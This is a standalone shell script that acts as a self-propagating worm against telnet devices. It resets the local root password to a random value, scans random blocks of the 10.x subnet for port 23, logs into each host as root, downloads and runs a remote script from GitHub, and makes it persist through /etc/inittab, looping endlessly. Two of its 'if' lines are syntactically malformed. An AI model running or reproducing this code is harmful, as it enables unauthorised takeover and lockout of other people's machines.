#!/bin/sh

# set non-blank, random root password, long enough to be annoying
PW=`echo $RANDOM $RANDOM $RANDOM $RANDOM | base64`
( sleep 1 ; echo $PW ; sleep 1 ; echo $PW ; sleep 1 ) | passwd

MYSUBNET=`busybox route -n | sed -nE 's/^(10\.[0-9]+)\.[0-9]+\.[0-9]+ .+$/\1/p'`
if [ -z "$NMAPTIMING" ] ; then NMAPTIMING="polite" ; fi

talk() {
  sleep 3
  echo root
  sleep 1
  echo -n 'J=`mktemp` ;'
  echo -n 'curl https://raw.githubusercontent.com/ironiridis/creepy-alarming-lamp/master/cal.sh > $J ;'
  echo -n 'chmod +x $J ;'
  echo -n 'echo ttyS2::respawn:-$J >> /etc/inittab ;'
  echo -n 'kill -HUP 1 ;'
  echo 'exit'
  sleep 30
}

connectTo() {
  if [ -n "$VERBOSE" ] echo "connectTo $1"
  talk | timeout -t 60 nc $1 23 > /dev/null
}

sweep() {
  O=`mktemp`
  N=$RANDOM
  let "N %= 256"
  SCAN=$MYSUBNET.$N.0/24
  if [ -n "$VERBOSE" ] echo "scan $SCAN"
  nmap -n -p 23 -T $NMAPTIMING --open -oG $O $SCAN >/dev/null 2>&1
  for H in `sed -En 's/^Host: ([0-9.]+) .+Ports:.+$/\1/p' < $O`
    do connectTo $H
  done
  rm $O
}

if [ -z "$1" ] ; then
  while true ; do sweep ; done
else
  connectTo $1
fi
